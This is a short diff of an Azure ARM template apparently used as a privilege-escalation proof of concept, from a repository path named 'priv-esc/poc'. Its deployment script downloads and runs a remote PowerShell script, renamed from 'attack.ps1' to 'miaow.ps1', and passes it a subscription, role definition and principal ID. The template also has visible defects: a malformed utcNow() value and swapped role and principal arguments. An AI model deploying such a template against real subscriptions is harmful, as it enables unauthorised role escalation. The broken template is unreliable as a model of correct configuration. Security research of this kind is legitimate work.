@@ -35,15 +35,15 @@
             },
             "properties": {
                 "forceUpdateTag": "[utcNow()"],
-                "azPowerShellVersion": "5.4",
+                "azPowerShellVersion": "9.7",
                 "arguments": "[format(' -subscriptionId {0} -roleDefinition {1} -principalId {2}', subscription().subscriptionId, parameters('principalId'), parameters('roleDefinitionId'))]",
-                "primaryScriptUri": "https://raw.githubusercontent.com/SecureHats/azure-misfit/azurekid/priv-esc/poc/priv-esc-arm-template/attack.ps1",
+                "primaryScriptUri": "https://raw.githubusercontent.com/SecureHats/azure-misfit/azurekid/priv-esc/poc/priv-esc-arm-template/miaow.ps1",
                 "supportingScriptUris": [],
                 "timeout": "PT30M",
                 "cleanupPreference": "Always",
                 "retentionInterval": "P1D",
                 "containerSettings": {
-                    "containerGroupName": "remove"
+                    "containerGroupName": "miaow"
                 }
             }
         }
